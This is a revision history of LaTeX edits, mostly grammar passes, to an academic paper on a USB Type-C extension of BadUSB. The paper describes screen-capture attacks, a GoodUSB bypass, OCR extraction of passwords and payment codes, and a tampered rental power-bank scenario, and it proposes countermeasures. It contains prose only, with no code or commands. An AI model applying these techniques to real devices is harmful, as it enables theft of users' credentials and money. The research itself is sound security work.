-Apart from these essential parts, we also uses an auxiliary power-bank to
+Apart from these essential parts, we also use an auxiliary power-bank to
 provide power for the Raspberry Pi and the mobile devices used by the victim.
@@
 outdated and cannot be executed at modern OS; so we have to home-brew a similar
-defense mechanism based on its paper~\cite{tian2015defending}.  At the
-beginning, our home-brewed version of GoodUSB asked victim to manually complete
+defense mechanism based on its paper~\cite{tian2015defending}.  In the
+beginning, our home-brewed version of GoodUSB asked the victim to manually complete
 a CAPTCHA to authorize the new USB device, a.k.a our \tool. But at this time,
@@
 understand.}\hongyi{Fixed, removed redundant description} our \tool can already perform limited keystroke to complete the
-CAPTCHA with video stream from \tool. Up
+CAPTCHA with the video stream from \tool. Up
 to this point, the bypass of defense like GoodUSB is completed as our \tool
@@
 reverse shell backdoor to malware payload execution, all of which resulting in
-success.  With this experiment, we have proven the defense bypassing is succeed
+success.  With this experiment, we have proven the defense bypassing is successful
 using \tool.
@@
 target device.  In the privacy extraction mode, \tool passively captured video
-from the victim's device and used \textit{OpenCV} to identify valuable
+from the victim's device and used \textit{OpenCV} to identify the valuable
 information from video stream.  When the victim viewed text or photos with
 text, \tool used the techniques of Optical Character Recognition (OCR) to
-extract text from corresponding video frames.  In this experiment, attacker had
-successfully extracted text like name, address, ID number and other sensitive
-personal information. We also tested the payment code extractor, which enables
-attacker to identify payment code in the video stream and perform transaction
-without password. As this is also a part of our case study, more details about
+extract text from corresponding video frames.  In this experiment, the attacker had
+successfully extracted text like name, address, ID number, and other sensitive
+personal information. We also tested the payment code extractor, which the enables
+attacker to identify payment code in the video stream and perform transactions
+without the password. As this is also a part of our case study, more details about
 the data extracted can be found in Section~\ref{subsec:case_study} and
@@
 experiment, we have found that as privacy extraction mode only needs to
-process victim's video stream locally, it does not need to transmit the real-time video back to the attacker. This mode is useful when there is no stable network connection between \tool and attacker.
+process the victim's video stream locally, it does not need to transmit the real-time video back to the attacker.
+This mode is useful when there is no stable network connection between \tool and the attacker.
 
@@
 stream from the target device to the attacker via WiFi.  After the connection
-establishment, attacker performed a series actions to test the capability of
-\tool. At the beginning, attacker accessed album application on the iPad and
-obtained all the photos inside. After that, attacker sent messages via victim's
-account. At last, attacker performed a small amount of transaction using the
+establishment, the attacker performed a series actions to test the capability of
+\tool. In the beginning, the attacker accessed album application on the iPad and
+obtained all the photos inside. After that, the attacker sent messages via victim's
+account. At last, the attacker performed a transaction using the
 financial application. All of these tests resulted in success.
@@
 emulation, \tool extensively expanded the attack capability of BadUSB,
-especially in mobile devices. We have archived complete hijack of victim's
+especially in mobile devices. We have archived the complete hijack of the victim's
 device in this experiment.
@@
 users can rent a power bank from any of the power bank station, charge their
-device on the trip, return the rented power bank to the near station and pay
+device on the trip, return the rented power bank to the near station, and pay
 the rental fee.
 
-For an example, Brick~\cite{Brick} is such a power bank sharing service
-provider from Sweden. It provides power bank rental service all over the Sweden
-and is planning on expanding their service around Europe. Moreover, this
+For example, Brick~\cite{Brick} is such a power bank sharing service
+provider from Sweden. It provides power bank rental service all over Sweden
+and is planning on expanding its service around Europe. Moreover, this
 service is even more popular in Asia, power bank stations are deployed in
@@
 hardly cautious to check the power banks when connecting their devices.  An
-attacker is able to tamper rented power banks and return it to a power bank
-station causing potential threat to subsequent users.
+attacker is able to tamper rented power banks and return them to a power bank
+station causing a potential threat to subsequent users.
 
 \textbf{QR Code Payment}.
-QR code payment is a new type of payment method that are popular in Asia.
-Its most well known cases are WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay}.
+QR code payment is a new type of payment method that is popular in Asia.
+Its most well-known cases are WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay}.
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
 QR code payment is typically performed in the following steps:
-\ding{182} The client presents payment QR code on mobile device to the merchant.
+\ding{182} The client presents the payment QR code on the mobile device to the merchant.
 The QR code is encoded with a globally unique ID to identify the client's account.
-\ding{183} The merchant scans the payment QR code and charges corresponding amount of money.
-By presenting this QR code, the client authorizes proceeding charge.
+\ding{183} The merchant scans the payment QR code and charges the corresponding amount of money.
+By presenting this QR code, the client authorizes the proceeding charge.
 \ding{184} An transaction generated by this scan is sent to the payment service provider.
@@
 permission which aims to provide convenience to both merchant and client.  If a
-victim's payment code is leaked to the attackers, they can use the that code to
+victim's payment code is leaked to the attackers, they can use that code to
 authorize multiple micropayments without permission.  In order to prevent such
@@
 payment code, which is to refresh the QR code every minute. This is sufficient
-to stop attack like sneak shots, but unable to stop real-time attack like our
+to stop an attack like sneak shots but unable to stop a real-time attack like our
 \tool.  In summary, the payment QR code is highly sensitive on users' devices
@@
 
-In this part, we will introduce a real life attack scenario to show that our
+In this part, we will introduce a real-life attack scenario to show that our
 \tool is a practical offensive tool.  This scenario can be decomposed into the
@@
 \begin{enumerate}[I. ]
-	\item The attacker rents a power bank from one of power bank stations and replaces the internal components with \tool.
-	\item After the modification, an attacker-crafted power bank is returned to a rental station in a crowded area like airport or railway station, which increases the probability of success.
+	\item The attacker rents a power bank from one of the power bank stations and replaces the internal components with \tool.
+	\item After the modification, an attacker-crafted power bank is returned to a rental station in a crowded area like an airport or railway station, which increases the probability of success.
 	\item a user borrows the modified power bank and connects it to her own device, becoming the victim of \tool.
-	\item The attacker now has complete control over victim and can perform various attack using different modes.
+	\item The attacker now has complete control over the victim and can perform various attacks using different modes.
 \end{enumerate}
 
-Here we summarizes the possible threats toward user under different modes. \hongyi{Better way to express this?}
+Here we summarize the possible threats toward user under different modes. \hongyi{Better way to express this?}
 First, under scripting mode, the attacker is able to implant malware and backdoor script into victims' devices.
@@
 \shuqing{Background is longer than real user study.}
-As the functionality and effectiveness of scripting mode and remote control mode is rather clear, the former works similar to original BadUSB, the latter hijacks the victim's device completely.\hongyi{I dont know if it's a good enough reason}
+As the functionality and effectiveness of the scripting mode and the remote control mode are rather clear, the former works similar to the original BadUSB, the latter hijacks the victim's device completely.\hongyi{I dont know if it's a good enough reason}
 Here we only validate the usability of privacy extraction mode and conducted a user study.
@@
 We invited 10 volunteers to participate, who are unconscious of \tool details.
-Before the experiment, we disclose to the volunteers about how their data might be used and request permission from both the volunteers and the institutional ethics review boards.
+Before the experiment, we disclose to the volunteers how their data might be used and request permission from both the volunteers and the institutional ethics review boards.
 During the experiment, volunteers took turns to use their phones for half an hour with \tool connected, which are considered as a normal power bank.
-In order to obtain data close to real life, they are requested to use phones just like when they use the shared power bank outside.
-After the experiment, we introduced to them about our attack, analyze the screen recordings together to make sure their personal data is not at risk.
+To obtain data close to real life, they are requested to use phones just like when they use the shared power bank outside.
+After the experiment, we introduced to them our attack, analyze the screen recordings together to make sure their personal data is not at risk.
 \shuqing{Do we need to mention that agreement the conference required here?}
@@
 With these results, we could learn what content the victim was browsing.
-Additionally, some keywords such as \textit{account, username and password} often appear with users' input data because they are often used as labels of input boxes.
+Additionally, some keywords such as \textit{account, username, and password} often appear with users' input data because they are often used as labels of input boxes.
 Such keywords are more likely to lead us to user-specific data.
-For example, when we searched with \textit{account} as keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
+For example, when we searched with \textit{account} as a keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
 \shuqing{Statistics.}
@@
 In the manual analysis, we replayed the recorded video and extracted sensitive information.
-The data we collected are listed in the Table~\ref{table:information_extracted}.
+The data we collected are listed in Table~\ref{table:information_extracted}.
 Accounts of internet applications such as Apple, iCloud, Facebook, Twitter, etc. can be obtained.
 Moreover, all of the typing inputs on the virtual keyboard, including the system keyboard and the built-in security keyboard of the financial applications, can be clearly recorded.
-We can obtain the plain text of password such as WiFi password.
+We can obtain the plain text of passwords such as WiFi passwords.
 Furthermore, the received SMS verification code (usually used to confirm real-name authentication) can be obtained when it appears in the top notification bar.

### 2021-01-30 WOOT/Files/conclusion.tex
grammarlized done

@@
 victim's sensitive information in a stealthy way. The remote control mode
-archives complete hijack of the target device, allowing us to perform various
-type of subsequent attacks. By experimenting \tool with mobile phones, tablets,
-and PCs, we further tests its ability under different mode and proves it can
+archives the complete hijack of the target device, allowing us to perform various
+types of subsequent attacks. By experimenting \tool with mobile phones, tablets,
+and PCs, we further test its ability under different mode and proves it can
 bypass defenses such as GoodUSB~\cite{tian2015defending}. In our user study, we
-obtains and analyzes video stream extracted from 10 participants with \tool,
+obtain and analyze video stream extracted from 10 participants with \tool,
 which demonstrates its capability in a real-life scenario. In the end, we
@@
 As future work, we will further explore the potential of \textit{isolated UI
-rendering} and implement it on a customized operating system. Moreover we also
+rendering} and implement it on a customized operating system. Moreover, we also
 hope to lower the power consumption for network transmission in \tool to make

### 2021-01-30 WOOT/Files/introduction.tex
pass on intro

@@
 
-The Universal Serial Bus (USB) protocol has become popular around the world since its appearance, as it provides a unified and easy-to-use approach for a large range of devices to communicate with each other.
-From version 1.0 till now, USB specification has evolved rapidly and offered more and more functionalities.
-Nowadays, devices with USB support are ubiquitous.
+The Universal Serial Bus (USB) protocol has become popular around the world
+since its appearance, as it provides a unified and easy-to-use approach for a
+large range of devices to communicate with each other.  From version 1.0 till
+now, USB specification has evolved rapidly and offered more and more
+functionalities.  Nowadays, devices with USB support are ubiquitous.
 
 On the other side of the coin, the security of USB has caused serious problems.
-The designers of the USB protocol did not care much about security issues as they wanted to make an easy-to-use protocol.
-There are more than four hundred vulnerabilities referencing USB on CVE list~\cite{website:CVE-list}.
-As a result, many attackers exploit these vulnerabilities and the \textit{trust-by-default} characteristics of USB to conduct attacks, which puts the privacy and financial security of USB users in danger~\cite{sok}.
+The designers of the USB protocol did not care much about security issues as
+they wanted to make an easy-to-use protocol.  There are more than four hundred
+vulnerabilities referencing USB on CVE list~\cite{website:CVE-list}.  As a
+result, many attackers exploit these vulnerabilities and the
+\textit{trust-by-default} characteristics of USB to conduct attacks, which puts
+the privacy and financial security of USB users in danger~\cite{sok}.
 
-BadUSB is a well-known class of firmware attacks~\cite{badusb}.
-These attacks are conducted through modification of the device firmware, which will disguise normal USB devices as other types of devices that are \textit{trust-by-default} by the hosts.
-Typical simulated devices include HID (short for human interface devices, including keyboards, mice, etc.) and disks.
-Utilizing BadUSB, attackers can pretend themselves as normal users, typing malicious commands to victim computers, downloading and executing malicious scripts, and copying out private data from disks.
-Such attacks can easily escape from traditional anti-virus software since it is hard to distinguish them from normal USB devices.
+BadUSB is a well-known class of firmware attacks~\cite{badusb}.  These attacks
+are conducted through modification of the device firmware, which will disguise
+normal USB devices as other types of devices that are \textit{trust-by-default}
+by the hosts.  Typical simulated devices include HID (short for human interface
+devices, including keyboards, mice, etc.) and disks.  Utilizing BadUSB,
+attackers can pretend themselves as normal users, typing malicious commands to
+victim computers, downloading and executing malicious scripts, and copying out
+private data from disks.  Such attacks can easily escape from traditional
+anti-virus software since it is hard to distinguish them from normal USB
+devices.
 
-Despite the advantageous features of BadUSB, there exist several limitations as follows.
-(1) Attackers cannot conduct attacks precisely, which decreases the capabilities of BadUSB attacks.
-When performing attacks on another host, the attackers can not obtain the current user interface (UI) status which limits them from taking subsequent moves.
-For example, it is hard for attackers to locate specific functional UI patterns like buttons and links on victim computers by disguising USB devices like mice.
-That explains why typical BadUSB attacks often only stay in the command line, using commands to download malicious scripts for execution.
-However, these attacks may be intercepted by anti-virus software or firewall due to the usage of the host network.
-(2) To our best knowledge, existing BadUSB attacks only utilize the features of USB 2.0.
-The release of USB 3.0 makes USB more powerful, with a higher transmission rate for data and the support towards a larger range of peripherals including DisplayPort, HDMI, PowerDelivery, etc.
-BadUSB attacks can become more effective with the help of newly supported features in USB 3.0.
-(3) There have emerged multiple efficacious countermeasures after the appearance of BadUSB.
-For example, GoodUSB offers a defense method by limiting the functions of USB devices to users' expectations~\cite{tian2015defending}.
-It provides a graphical interface for users to describe the functionalities or roles of the USB device and reject any usage beyond the description.
+Despite the advantageous features of BadUSB, there exist several limitations as
+follows.  (1) Attackers cannot conduct attacks precisely, which decreases the
+capabilities of BadUSB attacks.  When performing attacks on another host, the
+attackers can not obtain the current user interface (UI) status which limits
+them from taking subsequent moves.  For example, it is hard for attackers to
+locate specific functional UI patterns like buttons and links on victim
+computers by disguising USB devices like mice.  That explains why typical
+BadUSB attacks often only stay in the command line, using commands to download
+malicious scripts for execution.  However, these attacks may be intercepted by
+anti-virus software or firewall due to the usage of the host network.  (2) To
+our best knowledge, existing BadUSB attacks only utilize the features of USB
+2.0.  The release of USB 3.0 makes USB more powerful, with a higher
+transmission rate for data and the support towards a larger range of
+peripherals including DisplayPort, HDMI, PowerDelivery, etc.  BadUSB attacks
+can become more effective with the help of newly supported features in USB 3.0.
+(3) There have emerged multiple efficacious countermeasures after the
+appearance of BadUSB.  For example, GoodUSB offers a defense method by limiting
+the functions of USB devices to users' expectations~\cite{tian2015defending}.
+It provides a graphical interface for users to describe the functionalities or
+roles of the USB device and reject any usage beyond the description.
 %\shuqing{Can't bypass USBCheckIn.}
 
-In this work, we proposed our approach addressing the limitations mentioned above and implemented a multi-mode attack model of USB, named \tool.
-\tool extends BadUSB to support the features of USB Type-C.
-Since USB Type-C is capable to transfer video stream data, \tool could obtain the information of victim's graphical interface during attacks.
-Combining it with the emulation of traditional HIDs like keyboards and mice, attackers can perform precise attacks.
-We did experiments to verify that \tool could also bypass many countermeasures for BadUSB since they often rely on interaction with the graphical interface.
-Moreover, we implemented multiple attacking modes of USB attacks based on our approach to verify its effectiveness, including scripting, remote control, and privacy extraction.
-To improve the efficiency and performance of \tool, we designed a filtering algorithm to preprocess the video data before network transmission.
-Moreover, we conducted a series of experiments for each attack mode as well as for different types of devices, including smartphones, personal computers, and tablet computers, to validate the usability of \tool.
-We also conducted a user study for attacks in sharing power banks, one of the application scenarios of \tool.
-During the user study, we obtained plenty of sensitive data through \tool, since users are usually unconscious of the necessity to check the USB devices they plugged in for security purposes.
-After the validation of our attack model, we proposed several defense methods as countermeasures, including external hardware authorization, distrust-by-default, etc.
-It is worth noting that we designed a method, called isolated UI rendering, to separate the user interface into sensitive and insensitive layers.
-Only content on the insensitive layer will be passed to the insecure driver and thus rendered on the external display, which protects content on the sensitive layer.
+In this work, we proposed our approach addressing the limitations mentioned
+above and implemented a multi-mode attack model of USB, named \tool.  \tool
+extends BadUSB to support the features of USB Type-C.  Since USB Type-C is
+capable to transfer video stream data, \tool could obtain the information of
+victim's graphical interface during attacks.  Combining it with the emulation
+of traditional HIDs like keyboards and mice, attackers are capable of
+performing precise attacks.  We did experiments to verify that \tool could also
+bypass many countermeasures for BadUSB since they often rely on interaction
+with the graphical interface.  Moreover, we implemented multiple attacking
+modes of USB attacks based on our approach to verify its effectiveness,
+including scripting, remote control, and privacy extraction.  To improve the
+efficiency and performance of \tool, we designed a filtering algorithm to
+preprocess the video data before network transmission.  Moreover, we conducted
+a series of experiments for each attack mode as well as for different types of
+devices, including smartphones, personal computers, and tablet computers, to
+validate the usability of \tool.  We also conducted a user study for attacks in
+sharing power banks, one of the application scenarios of \tool.  During the
+user study, we obtained a large amount of sensitive data through \tool, since
+users are usually unconscious of the necessity to check the USB devices they
+plugged in for security purposes.  After the validation of our attack model, we
+proposed several defense methods as countermeasures, including external
+hardware authorization, distrust-by-default, etc.  It is worth noting that we
+designed a method, called isolated UI rendering, to separate the user interface
+into sensitive and insensitive layers.  Only content on the insensitive layer
+will be passed to the insecure driver and thus rendered on the external
+display, which protects content on the sensitive layer.
 %\shuqing{Case study, evaluation, notable results.}
@@
 We summarize our key contributions as follows:
+
 \begin{itemize}
-	\item To our best knowledge, this is the first work to utilize new features of USB Type-C.
-	The combination of new support with conventional BadUSB makes attacks more precise and effective.
+
+    \item To our best knowledge, this is the first work to utilize new features
+	of USB Type-C.  The combination of new support with conventional BadUSB
+	makes attacks more precise and effective.
+
     \item Our approach can bypass many previous countermeasures of BadUSB.
-	\item We conducted multiple experiments and a user study to validate the usability and effectiveness of \tool.
-	We also proposed several countermeasures for our attack model, which are reasonable and insightful. 
+
+    \item We conducted multiple experiments and a user study to validate the
+	usability and effectiveness of \tool.  We also proposed several
+	countermeasures for our attack model, which are reasonable and
+	insightful. 
 	%\fengwei{Add countermeasures, in particular the isolation design.}
@@
 
-The rest of this paper is structured as follows.
-Section~\ref{sec:background} provides the background of USB specification.
-Section~\ref{sec:related_work} introduces the existing work of USB security from the aspects of attacking and defense respectively.
-In Section~\ref{sec:badusb}, we present the threat model and the overall implementation of \tool in three different modes.
-The experiments and user study we conducted are featured in Section~\ref{sec:experiment}.
-We present the possible countermeasures of \tool in Section~\ref{sec:countermeasures}.
-The limits and impacts of our approach are discussed in Section~\ref{sec:discussion}, and the conclusion lies in Section~\ref{sec:conclusion}.
+The rest of this paper is structured as follows.  Section~\ref{sec:background}
+provides the background of USB specification.  Section~\ref{sec:related_work}
+introduces the existing work of USB security from the aspects of attacking and
+defense respectively.  In Section~\ref{sec:badusb}, we present the threat model
+and the overall implementation of \tool in three different modes.  The
+experiments and user study we conducted are featured in
+Section~\ref{sec:experiment}.  We present the possible countermeasures of \tool
+in Section~\ref{sec:countermeasures}.  The limits and impacts of our approach
+are discussed in Section~\ref{sec:discussion}, and the conclusion lies in
+Section~\ref{sec:conclusion}.
 %\shuqing{Fill in after the structure is finalized.}

### 2021-01-30 WOOT/Files/experiment.tex
[experiment] volunteer

--- 2021-01-29 WOOT/Files/experiment.tex
@@
 Here we only validate the usability of privacy extraction mode and conducted a user study.
-\shuqing{10 volunteers.}
 We invited 10 volunteers to participate, who are unconscious of \tool details.
@@
 During the automatic analysis, we used scripts to perform OCR recognition for each frame in the recorded video and stored all of the OCR results in a database.
-At last, there are 63882 pieces of data collected among 10 volunteers.
+At last, there are 94058 pieces of data collected among 10 volunteers.
 \shuqing{The data may need to be updated.}

### 2021-01-30 WOOT/Files/discussion.tex

@@
 Section~\ref{sec:countermeasures}, \tool can hardly bypass the defense
-approaches which use external hardware for authorization.  Moreover, most of
+approaches that use external hardware for authorization.  Moreover, most of
 the devices will prompt users to give authentication to the USB devices or
@@
 concealed within other functional hardware such as power banks \shuqing{If
-there is experiment, add it here.}, the probability whether users could get
-aware that something unusual happens will increase with the existence these
+there is experiment, add it here.}, the probability of whether users could get
+aware that something unusual happens will increase with the existence of these
 prompting messages.
@@
 %and application scenarios.}
-The USB protocol is used widely as introduced in preceding sections.  As the
+The USB protocol is used widely as introduced in the preceding sections.  As the
 technologies develop rapidly, more and more devices will be equipped with USB-C
-capabilities, which makes \tool more influential.  Due to the neglection to
+capabilities, which makes \tool more influential.  Due to the neglect to
 check the security of plugged-in USB devices of non-professional users, \tool
@@
 Attackers can use such technologies to perform more precise attacks, such as
-interacting with user interface, as well as control the consequences of their
+interacting with the user interface, as well as control the consequences of their
 attacks.  In summary, \tool can be applied in various application scenarios and

### 2021-01-30 WOOT/Files/related_work.tex

@@
 attacks~\cite{badusb} are unable to obtain video feedback from the victim
-as video was not supported until USB 3.0~\cite{usb30}. Though USB 2.0 does not
+as video stream was not supported until USB 3.0~\cite{usb30}. Though USB 2.0 does not
 support video transmission, there exists a protocol called MHL (Mobile
@@
 including the video data, could be recovered in this way, these attacks for
-executing malicious code are too difficult to work, and the invisibility is a
-problem that cannot be ignored due to the spatial locality of radio frequency.
+executing malicious code are too difficult to work, and invisibility is a
+problem that cannot be ignored due to the spatial locality of radiofrequency.
 
@@
 the host, an attacker cannot complete this authorization with
-an automatic script. Thus this defense is sufficient for normal BadUSB attack. But
+an automatic script. Thus this defense is sufficient for a normal BadUSB attack. But
 if the attacker has the access to victim's screen, GoodUSB will be bypassed
@@
 block the execution of unsigned files and the installation of unsigned drivers
-carried on portable media. Moreover, in GoodUSB, a VM is deployed in the host to as
+carried on portable media. Moreover, in GoodUSB, a VM is deployed in the host as
 a honeypot to detect and stop malicious behavior of USB devices.
@@
 plug-and-play property. Though hardware disabling solutions like USB Condom
-archives almost absolute security, the functionality of USB is scarified.
+archives almost absolute security, the functionality of USB is sacrificed.
 Other solutions like GoodUSB or whitelist are either bypassable or insufficient
 under certain cases.  Some vendors may sacrifice defensive capabilities to
-improve the usability, which allows attackers to take advantage of.
+improve usability, which allows attackers to take advantage of.
 

### 2021-01-30 WOOT/Files/background.tex
pass on bg

@@
 %\noindent\outline{USB1.x}\\
-Proposed in 1996, USB 1.0\cite{usb10} was developed to provide a unified
+Proposed in 1996, USB 1.0~\cite{usb10} was developed to provide a unified
 interface and thus reducing the cost of reconfiguring the software. It is
@@
 Interface Device)~\cite{hid} was born based on USB. HID is
-designed with to unify the implementation for devices like mouse,
-keyboard, etc. Before its appearance, the standard is divided between
+designed with to unify the implementation for devices like mice,
+keyboards, etc. Before its appearance, the standard is divided between
 manufacturers, for example, the mouse of Company A may use X-Y coordinates to
 represent its location while the mouse of Company B uses relative displacement.
-This means every device needs its own drivers to work. After HID, people just
+This means every device needs its own driver to work. After HID, users only need to
 write one driver for an entire class of HIDs. Furthermore, HID standard also
@@
 
-In 1998, the first widely supported USB protocol was born. USB1.1\cite{usb11}
-provided two data transfer rates which are Low Speed (1.5 Mbit/s) and Full
-Speed (12 MBit/s). At this point, due to the transfer limit, it only supports
+In 1998, the first widely supported USB protocol was born. USB1.1~\cite{usb11}
+provided two data transfer rates which are low speed (1.5 Mbit/s) and full
+speed (12 MBit/s). At this point, due to the transfer limit, it only supports
 limited types of devices like keyboards, mice, etc.
@@
 %\noindent\outline{USB2.0}\\
-In 2000, USB 2.0\cite{usb20} specification was released. With High Speed (480
-Mbit/s) mode introduced, printer, camera, CD-ROM drive, and network cards were
+In 2000, USB 2.0~\cite{usb20} specification was released. With high speed (480
+Mbit/s) mode introduced, printers, cameras, CD-ROM drives, and network cards were
 supported in this revision. Such a high data transfer rate also gave rise to the
@@
 %\noindent\outline{USB3.x}\\
-USB 3.0\cite{usb30} was announced in 2008, with a Super Speed (5 Gbit/s) data
+USB 3.0~\cite{usb30} was announced in 2008, with a super speed (5 Gbit/s) data
 transfer rate. Like its predecessor, more classes of peripherals were supported
 in this revision. In 2013, the USB Type-C connector standard was introduced as a
-part of USB 3.1\cite{usb31}, providing a unified connector type for
+part of USB 3.1~\cite{usb31}, providing a unified connector type for
 PowerDelivery (PD), Thunderbolt, DisplayPort, and HDMI.  Yet no improvement of
@@
 itself as a monitor can capture the video stream from the host. Exposing
-such a multi-propose connector unprotected is dangerous and allows attacks like
-this work \tool. In 2017, USB 3.2\cite{usb32} was released, doubling the data
+such a multi-propose connector unprotected is insecure and allows attacks like
+this work \tool. In 2017, USB 3.2~\cite{usb32} was released, doubling the data
 transfer rate (20 Gbit/s).
@@
 connector only has two pins for data transferring (D+ \& D-), which has
-significantly limited data transfer rate (5 Gbits/s Max) and support for
-peripheral like DisplayPort (10.8 Gbit/s Min). Apart from that, support for
-other peripheral also requires dedicated transferring lane as their standards
-are not compatible with USB in most cases.  \begin{figure}[t] \centering
-\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png} \caption{USB Type C
-Connector} \label{fig:usb_c_conn} \end{figure}
+significantly limited data transfer rate (5 Gbits/s Max) and cannot support for
+peripherals like DisplayPort (10.8 Gbit/s Min). Apart from that, support for
+other peripherals also require dedicated transferring lane as their standards
+are not compatible with USB in most cases.
+
+\begin{figure}[t] 
+	\centering
+	\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png} 
+	\caption{USB Type C Connector} 
+	\label{fig:usb_c_conn} 
+\end{figure}
 
 Thus, to provide support towards a wider range of peripherals, a 24-pins
-standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF. As it is designed to be double-sided, the number of actually usable
+standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF.\fengwei{Add a citation for USB-IF} As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability
@@
 %\fengwei{FIXME: add a reference for each attack in the Table.}
+%\fengwei{FIXME: The table is too wide, exceeds the max size.}
 \begin{table*}
-\begin{tabular}{|c|c|c|c|c|}
+\begin{tabular}{clccc}
 	\hline
-	Year & Protocol Version & Supported Peripherals & Transfer Speed & Attacks \\
+	\textbf{Year} & \textbf{Protocol Version} & \textbf{Supported Peripherals} & \textbf{Transfer Speed} & \textbf{Attacks} \\
 	\hline
 	1996 & USB 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating(BadUSB)~\cite{badusb} \\
-	\hline
-	2000 & USB 2.0~\cite{usb20} & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack~\cite{duqu}, Juice Filming Attack~\cite{JFC,JFCImpact} \\
-	\hline
+	2000 & USB 2.0~\cite{usb20} & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack~\cite{duqu}, Juice Filming~\cite{JFC,JFCImpact} \\
 	2008 & USB 3.0~\cite{usb30} & / & 5 Gbit/s & / \\
-	\hline
 	2013 & USB 3.1~\cite{usb31} & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & \tool \\
-	\hline
 	2017 & USB 3.2~\cite{usb32} & / & 20 Gbit/s & / \\
@@
 	\linebreak
-\caption{USB Protocol Timeline}
+\caption{USB Protocol Timeline.}
 \label{table:usb_timeline}

### 2021-01-30 WOOT/Files/background.tex
fixed some ref

@@
 Thus, to provide support towards a wider range of peripherals, a 24-pins
-standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF.\fengwei{Add a citation for USB-IF} As it is designed to be double-sided, the number of actually usable
+standard called USB Type-C~\cite{typec} is introduced in 2013 by USB-IF~\cite{usbif}.\fengwei{Add a citation for USB-IF} As it is designed to be double-sided, the number of actually usable
 pins is halved. Nevertheless, this standard has largely enhanced the capability

### 2021-01-30 WOOT/Files/experiment.tex
minor fix, of caption

@@
 QR code payment provides merchant and client a convenient way of offline payment while ensuring equivalent security as the credit card.
-QR code payment is typically performed in the following steps:
+As illustrated in Figure~\ref{fig:qr_payment_procedure}, QR code payment is typically performed in the following steps:
 \ding{182} The client presents the payment QR code on the mobile device to the merchant.
@@
 \ding{183} The merchant scans the payment QR code and charges the corresponding amount of money.
-By presenting this QR code, the client authorizes the proceeding charge.
-\ding{184} An transaction generated by this scan is sent to the payment service provider.
-Then the payment service provider requests the client to confirm the transaction.
-\ding{185} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the merchant and the client.
+By presenting this QR code, the client authorizes the proceeding transaction.
+\ding{184} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the merchant and the client.
 \shuqing{I think this paragraph can be shorter. No need to explain so many details.}
@@
 	\includegraphics[width=\linewidth]{./Figs/qr_code_payment.png}
-	\caption{Bar/QR code payment procedure}
+	\caption{Bar/QR Code Payment Procedure}
 	\label{fig:qr_payment_procedure}
@@
 	\end{tabular}
+	\linebreak
 	\caption{Example of searching OCR results with some keywords}

### 2021-01-30 WOOT/Files/related_work.tex
pass on related work.

@@
 
-We survey related works on USB attack in Section~\ref{subsec:usb_attack} and
+We survey related works on USB attacks in Section~\ref{subsec:usb_attack} and
 USB security defense in Section~\ref{subsec:usb_defence}, respectively.
 
-\subsection{USB Attack}
+\subsection{USB Attacks}
 \label{subsec:usb_attack}
 \chaozu{DoS(Fuzzing), Code injection, HID emulation, JFC, our work}
-\fengwei{Related work section needs to be improved. Many typos and grammar mistakes can be found.}
+%\fengwei{Related work section needs to be improved. Many typos and grammar mistakes can be found.}
 
@@
 charging is such a work that abuses this standard and exfiltrate video data
-from the victim without permission. But in JFC, this data exfiltration is not
-combined with BadUSB attacks and MHL is an outdated standard, which limits its
+from the victim without permission. However, in JFC, this data exfiltration is not
+combined with BadUSB attacks, and MHL is an outdated standard, which limits its
 capability.
@@
 % Using USB devices to inject code
-Besides attacking from the protocol perspective, works are trying to use a
+Besides attacking from the protocol perspective, previous works use a
 USB device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode
@@
 following the same paradigm and performing code-injection attacks. These
-attacks are much more damaging and flexible comparing to those previous ones,
-but they require certain existing flaw like \cite{zero-day} and USB is merely
+attacks are much more damaging and flexible,
+but they require certain existing flaws like a \cite{zero-day} vulnerability and USB is merely
 a payload delivery method.
@@
 executing malicious code are too difficult to work, and invisibility is a
-problem that cannot be ignored due to the spatial locality of radiofrequency.
+problem that cannot be ignored due to the spatial locality of radio frequency.
 
@@
 
-\subsection{USB Defence Security}
+\subsection{USB Security Defenses}
 \label{subsec:usb_defence}
+
 Many defenses have been proposed to defend against BadUSB attacks~\cite{sok}.
@@
 are defined by the protocol to transmitting data. Without these pins, data cannot 
-be transferred via USB cable. Based
+be transferred via a USB cable. Based
 on this fact, USB Condom~\cite{Condom} is a hardware solution to block data
@@
 Under the premise of ensuring the full functionality of USB devices, some works
-try to improve the security during connection establishment.  Windows Defender
+improve the security during the connection establishment. Windows Defender
 ATP~\cite{windenfenderwhite} maintains a whitelist of USB devices, only devices
 on the whitelist are allowed to communicate with the host. This prevents all
-potential attacks from untrusted devices. But this requires users to have a
-certain safety awareness and technical background to maintain a valid
+potential attacks from untrusted devices, however, this requires users to have a
+certain security awareness and technical background to maintain a valid
 whitelist. For example, a naive user may add the USB device from unknown
-sources to his/her whitelist without precaution. Some designs can overcome
-this drawback. For instance, Mohammadmoradi et
-al.~\cite{mohammadmoradi2018making} propose a strategy to generate such a
+sources to his/her whitelist without precaution. Fortunately, some designs have proposed to overcome
+this drawback. For instance, Mohammadmoradi \emph{et al.}~\cite{mohammadmoradi2018making} propose a strategy to generate such a
 whitelist automatically. This strategy first generates a unique fingerprint for
 each device based on its functionality. Then these fingerprints are used to
-maintain a safe and valid whitelist of USB devices. There is another work
-mediating USB connectivity for Industrial Control. TMSUI~\cite{yang2015tmsui}
+maintain a secure and valid whitelist of USB devices. There is another work
+mediating USB connectivity for industrial control. TMSUI~\cite{yang2015tmsui}
